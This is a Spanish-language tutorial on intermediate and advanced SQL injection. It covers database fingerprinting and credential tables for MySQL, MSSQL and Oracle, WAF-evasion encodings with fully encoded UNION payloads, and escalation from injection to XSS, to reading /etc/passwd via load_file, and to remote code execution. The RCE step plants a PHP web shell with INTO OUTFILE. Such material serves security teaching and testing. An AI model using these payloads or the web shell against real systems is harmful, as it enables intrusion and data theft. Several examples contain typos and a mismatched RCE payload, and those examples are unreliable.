
# INYECCIÓN SQLi - Medio - Avanzado 
## TEMAS

* [Antes de comenzar](#Antes-de-comenzar)
* [Inyecciónes sqli en diferentes bases de datos](#Inyecciónes-sqli-en-diferentes-bases-de-datos)
    * [MySQL](#MySQL)
      * [Bases de datos por defecto](#Bases-de-datos-por-defecto)
      * [Version de base de datos](#Version-de-base-de-datos)
      * [Credenciales por defecto](#Credenciales-por-defecto)
      * [Base de datos actual](#Base-de-datos-actual)
      * [Server Hostname ](#Server-Hostname)
    * [MySSQL](#MySSQL)
      * [Bases de datos por defecto](#Bases-de-datos-por-defecto)
      * [Version de base de datos](#Version-de-base-de-datos)
      * [Credenciales por defecto](#Credenciales-por-defecto)
      * [Base de datos actual](#Base-de-datos-actual)
      * [Server Hostname ](#Server-Hostname)
    * [Oracle](#Oracle)
      * [Bases de datos por defecto](#Bases-de-datos-por-defecto)
      * [Version de base de datos](#Version-de-base-de-datos)
      * [Credenciales por defecto](#Credenciales-por-defecto)
      * [Base de datos actual](#Base-de-datos-actual)
      * [Server Hostname ](#Server-Hostname)
* [Tipos de payloads](#Tipos-de-payloads)
   * [Boolean-based blind](#Boolean-based-blind)
   * [Error-based](#Error-based)
   * [Union query-based](#Union-query-based)
   * [Stacked queries](#Stacked-queries)
   * [Time-based blind](#Time-based-blind)
   * [Inline queries](#Inline-queries)
* [Codificaciónes](#Codificaciónes)
   * [Codificación con comentarios](#Codificación-con-comentarios)
   * [Codificación URL](#Codificación-URL)
   * [Mayusculas y minusculas](#Mayusculas-y-minusculas)
   * [Codificación Hex](#Codificación-Hex)
* [Crear payloads codificados](#Crear-payloads-codificados)
* [Haciendo uso de funciones sql para obtener información](#Haciendo-uso-de-funciones-sql-para-obtener-información)
   * [RPAD](#RPAD)
   * [SOUNDS LIKE](#SOUNDS-LIKE)
   * [UPPER](#UPPER)
   * [REVERSE](#REVERSE)
   * [RIGHT](#RIGHT)
   * [ELT](#ELT)
   * [HEX](#HEX)
   * [HUNEX](#HUNEX)
   * [CASE](#CASE)
   * [IF](#IF)
   * [EXTRACTVALUE](#EXTRACTVALUE)
* [Pasando de Inyección sql a otras vulnerabilidades](#Pasando-de-Inyección-sql-a-otras-vulnerabilidades)
   * [De Sqli a XSS](#De-Sqli-a-XSS)
      * [XSS reflectivo](#XSS-reflectivo)
      * [XSS persistente](#XSS-persistente)  
   * [De Sqli a LFR](#De-Sqli-a-LFR)
   * [De Sqli a RCE](#De-Sqli-a-RCE)
   

## Antes de comenzar

Este escrito esta pensado como una continuación directa a mi anterior lectura de inyecciones sqli en donde se explican de manera un poco más general las bases de esta vulnerabilidad , por lo que si no estas al tanto de ella te recomiendo que primero le des un repaso antes de empezar esta lectura, ya que este escrito será un poco más avanzado.


## Inyecciónes sqli en diferentes bases de datos

Vamos a empezar aclarando que una inyección sql no es igual en todas las bases de datos, si bien pueden ser un poco parecidas no son del todo igual, esto se debe a que cada base de datos tiene su propia sintaxis. 

Para dar un ejemplo de esto voy a tomar 3 bases de datos diferentes y trataré de mostrar las diferencias por separado, las bases de datos que vamos a ver son:

```
MySQL
MSSQL
ORACLE
```

La informacion que vamos a recopilar será la siguiente:

```

Bases de datos por defecto.
Conocer la version de la base de datos.
Bases de datos que contienen las credenciales por defecto.
Conocer la base de datos en la que estamos.
Conocer el Hostname del servidor.
Tablas y columnas.
Conocer los privilegios.

```

### MySQL

#### Bases de datos por defecto

```
mysql 
information_schema
```
#### Version de base de datos

```
VERSION()
@@VERSION
@@GLOBAL.VERSION
```

#### Credenciales por defecto

En este caso la base de datos de MySQL tiene por defecto las credenciales en una tabla llamada: 

```
mysql.user
```

Para ser mas exactos en las columnas: `user y password`

#### Base de datos actual

```
database()
schema()
```

#### Server Hostname 

```
@@HOSTNAME
```

### MySSQL

#### Bases de datos por defecto.

```
Model
Msdb
Tempdb
Northwind
Information_schema
```
#### Version de base de datos

```
@@VERSION
```

#### Credenciales por defecto

En este caso la base de datos de MySSQL tiene por defecto las credenciales en 2 tablas llamadas: 

```
master..syslogins
master..sysprocesses
```

Para ser mas exactos en las columnas: `name y loginame`

#### Base de datos actual

```
db_name()
```

#### Server Hostname 

```
@@SERVERNAME
SERVERPROPERTY()
```

### Oracle

#### Bases de datos por defecto.

```
System
Sysaux
```
#### Version de base de datos

```
VERSION
```

#### Credenciales por defecto

En este caso la base de datos de MySQL tiene por defecto las credenciales en una tabla llamada: 

```
all_users
sys.user$
```

Para ser mas exactos en las columnas: 

```
username

name y password
```

#### Base de datos actual

```
global_name
name
instance_name
SYS.DATABASE_NAME
```

#### Server Hostname 

```
host_name
UTL_INADDR.get_host_name
```

## Tipos de payloads

### Boolean-based blind

Boolean-based blind significa que la vulnerabilidad se basa en valores booleanos (true or false) y se dice que es ciega por que no muetra alguna señal de que hay un error en la página.

### Error-based

Error-based significa que la inyeccion se basa en los mensajes de error que el servidor responde y asi conocer un poco mas sobre la estructura de la base de datos que se esta usando.

### Union query-based

Union query-based significa que estamos aprovechando que el operador UNION de sql puede ser usado, gracias a esto podemos combinar declaraciones que serán visualizadas como parte de la respuesta del servidor.

### Stacked queries

Stacked queries significa que la vulneravilidad se basa en añadir mas consultas sql en serie, de esta manera mandar una consulta normal y al mismo tiempo mandar la consulta del atacante, todo esto solo dividiendo las consultas con un ";".

### Time-based blind

Time-based blind es cuando la vulnerabilidad se basa en el tiempo, lo que significa que un atacante enviará una consulta sql obligano a la base de datos a esperar una cierta cantidad de tiempo, si el tiempo de respuesta del servidor es el mismo tiempo que el atacante declaró en la sentencia, esto significa que es vulnerable.

### Inline queries

Inline queries consiste en unir una query sql dentro de otra y asi sucesivamente para ver si la sentencia es ejecutada.


## Codificaciónes 

Unos de los métodos más importantes que tenemos que tomar en cuenta al momento de hacer un testeo en una inyección sqli son las codificaciónes, las cuales nos ayudarán a que un payload pueda ser filtrado por algunos waf.

### Codificación con comentarios 

Este tipo de codificacion, como dice su nombre es usar la sintaxis para comentarios de sql, la cual es la siguiente:

```
/* */

/* Todo que que esta encerrado aquí es un comentario */

```

Ejemplo:

 `/*!UNION*/ /*!SELECT*/ 1`
 
###  Codificación URL 

La codificación URL reemplaza los espacios con un signo “+”, y algunos caracteres
ASCII con un signo “%” seguido por su equivalente en hexadecimal.

```
union select:

u	= %75
n	= %6e
i	= %69
o	= %6f
n	= %6e
space	= %20
s	= %73
e	= %65
l	= %6c
c	= %63
t	= %74
```

Ejemplo:

`%55nion %53elect 1`

### Mayusculas y minusculas

También podemos utilizár el método de mezclar mayusculas y minusculas para ver si podemos podemos evadir algunos filtros.

Ejemplo:

`UniOn SeLeCt 1`

### Codificación Hex

Esto se basa en codificar el método de comentarios que vimos antes en codigo hex:

`/%2A%2A/ y %2F**%2F`

Ejemplo:

```
/%2A%2A/union/%2A%2A/select/%2A%2A/1

%2F**%2Funion%2F**%2Fselect%2F**%2F1
```
 
## Crear payloads codificados

En esta parte me gustaría dar un ejemplo de como crear un payload codificado.

Primero vamos a definir el payload que queremos codificar:

``` 
union select 1,2,3,concat(table_name),5 from information_schema.tables where table_schema = database()

```

En este caso estamos usando el payload sin ningun tipo de codificacion, pero tenemos mas maneras de declarar el payload, esto cambiando su sintaxis y añadiendo otras cosas aun sin codificar, por ejemplo:

``` 
union all(select 1,2,3,concat(table_name),5) from information_schema.tables where table_schema = database()

```

Para empezar a codificar vamos a utilizar primero el método de comentarios:


``` 
/*!50000union*//**//*!50000all/*(/*!50000select*//**/1,2,3,/*!50000concat*/(table_name),5)/**//*!50000from*//**//*!50000information_schema.tables*//**//*!50000where*//**//*!50000table_schema*/=database()

```

Ahora ya lo tenemos codificado con comentarios, pero podemos mezclar codificaciones, por ejemplo con el método de URL:

``` 
/*!50000%75%6e%69on*//**//*!50000all/*(/*!50000%73%65%6cect*//**/1,2,3,/*!50000%63oncat*/(table_name),5)/**//*!50000%66rom*//**//*!50000%69nformation_schema.tables*//**//*!50000wh%65re*//**//*!50000table_schema*/=database()

```

De esta manera podemos evadir filtros y jugar con diferentes codificaciones y mezclas.


## Haciendo uso de funciones sql para obtener información

El lenguaje SQL tiene funciones incorporadas para hacer cálculos sobre los datos. Claro ese el uso "Oficial" de ellas, pero estamos en un escrito de inyecciones sql asi que vamos a darles un uso para este caso.

Para este ejemplo utilizarémos las siguientes funciones:

```
RPAD
SOUNDS LIKE
UPPER
REVERSE
RIGHT
ELT
HEX
HUNEX
CASE
IF
EXTRACTVALUE
```

### RPAD

Vamos a empezar con la funcion RPAD la cual devuelve la expr1 rellena por la derecha con la secuencia de caracteres de expr2 y con n caracteres de longitud. Esta función es útil para dar formato a la salida de una consulta.

su sintaxis es `RPAD(str, len [, padstr])`

Un ejemplo de su uso en una inyección sql:
 
`SELECT RPAD(table_name,50,'.') from information_schema.tables`

### SOUNDS LIKE 

Esta función puede ser usada para remplazar el simbolo = 

Ejemplo:

`SELECT concar(table_name) from information_schema.tables where table_schema sounds like database()`

### UPPER
 
Sintaxis: `UPPER(str)`

Ejemplo:

`select upper(table_name)from information_schema.tables`


### REVERSE

Sintaxis: `REVERSE(str)`

Ejemplo:

`Select reverse(reverse(table_Name)) from information_schema.tables`

NOTA: se utiliza doble reversa para que la información quede de manera entendible 

### RIGHT

sintaxis: `RIGHT(str,len)`

Ejemplo: 

`select right(table_name, 100) from information_schema.tables`

### ELT 

Sintaxis: `ELT(N, str1[, str2, str3,...])`

Ejemplo:

`Select elt(1, table_Name) from information_schema.tables`

### HEX

Sintaxis: `HEX(N_or_S)`

Ejemplo:

`Select hex( table_Name) from information_schema.tables`

### HUNEX

Sintaxis: `UNHEX(str)`

Ejemplo: `Select unhex(hex( table_Name)) from information_schema.tables`

### CASE

Ejemplo: `SELECT CASE WHEN (1=1) THEN table_name ELSE false END from information_schema.tables`

### IF

Ejemplo: `SELECT if(1=1,table_name,'<h3><font color=blue> Tablas:</h3>') from information_schema.tables`

### EXTRACTVALUE

Sintaxis: `EXTRACTVALUE(xml_frag, xpath_expr)`

Ejemplo: `SELECT extractvalue(rand(),concat(0x7e,version(),0x7e,user()))`

Con esto en mente, podemos mezclar entre funciones, diferentes tipos de codificacion y diferente sintaxis en las secuencias de sql para crear payloads cada vez más personalizados.


## Pasando de Inyección sql a otras vulnerabilidades

### De Sqli a XSS

Cuando tenemos una página vulnerable a inyección sql esta también es vulnerable a inyecciones sql,lo cual puede ser desde el parametro vulnerable pero en este caso vamos a aprobechar la inyección sql para inyectar xss, esto puede ser de 2 maneras:

#### XSS reflectivo   

En la columna vulnerable vamos a inyectar el payload xss que queramos.

"IMPORTANTE" lo tenemos que pasar a hex.

Para el ejemplo vamos a usar este payload:

`<script>alert("_Y000!_")</script>`

Ahora en HEX:

`0x3c7363726970743e616c65727428225f59303030215f22293c2f7363726970743e`

Ejemplo:

`union+select+1,0x3c7363726970743e616c65727428225f59303030215f22293c2f7363726970743e,3+--+`

De esta manera estamos haciendo un xss reflectivo.

#### XSS persistente

Para un xss persistente necesitamos tener permisos de escritura, todo va bien y la página vulnerable nos da permisos tenemos que hacer lo siguiente:

Haciendo uso de la funcion INTO OUTFILE vamos a escribir un archivo en la raiz de la página.

Ejemplo:

`union+select+1,'<script>alert("_Y000!_")</script>',3+INTO+OUTFILE+'ruta/nombre.html'+--+`

Y con eso vamos a crear un archivo .html con nuestro XSS persistente.

### De Sqli a LFR

Sql tambien tiene una funcion que nos permite cargar archivos locales y con eso podemos leer archivos a los que normalmente no deberiamos tener acceso 

Ejemplo: `union all select load_file(‘/etc/passwd’)`

### De Sqli a RCE

Usando el mismo metodo con el que hicimos un xss persistente vamos a hacer lo siguiente:

Vamos a inyectar codigo php con el cual vamos a generar una shell con la que vamos a poder ejecutar comandos dentro del servidor vulnerable

Codigo:  `'<?php system($_GET["cmd"]); ?>'`

Lo vamos a inyectar usando un:

INTO+OUTFILE+'ruta/nombre.php'

Ejemplo: 

`union+select+1,'load_file(‘/etc/passwd’)',3+INTO+OUTFILE+'ruta/nombre.php'+--+`

Por ultimo, para usarlo vamos a la siguiente ruta:

`http://vulnerable.com/nombre.php?=ls`

Como pueden ver, estamos haciendo uso de la shell que inyectamos para ejecutar los comandos.

Para verlo un poco mas grafico, pueden verlo desde aqui: https://twitter.com/_Y000_/status/1249877772979384320

------------------------------------------- 


Muchas gracias por dedicarle el tiempo! si tienes alguna sugerencia con gusto puedes decirmela! 
